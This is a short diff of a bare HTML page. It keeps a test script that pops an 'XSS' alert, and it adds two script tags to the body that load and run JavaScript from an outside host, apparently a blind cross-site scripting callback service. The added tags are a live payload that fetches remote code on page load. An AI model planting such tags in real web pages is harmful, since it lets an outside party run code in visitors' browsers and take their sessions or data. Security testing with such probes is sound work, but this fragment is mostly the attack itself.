@@ -1,8 +1,10 @@
 <HTML>
 <HEAD>
-<SCRIPT LANGUAGE="JavaScript">alert('XSS')</SCRIPT>
+  <SCRIPT LANGUAGE="JavaScript">alert('XSS')</SCRIPT>
 </HEAD>
 <BODY>
+  <script>$.getScript("//roshk.bxss.in")</script>
+  <script src=https://roshk.bxss.in></script>
 </BODY>
 </HTML>
 
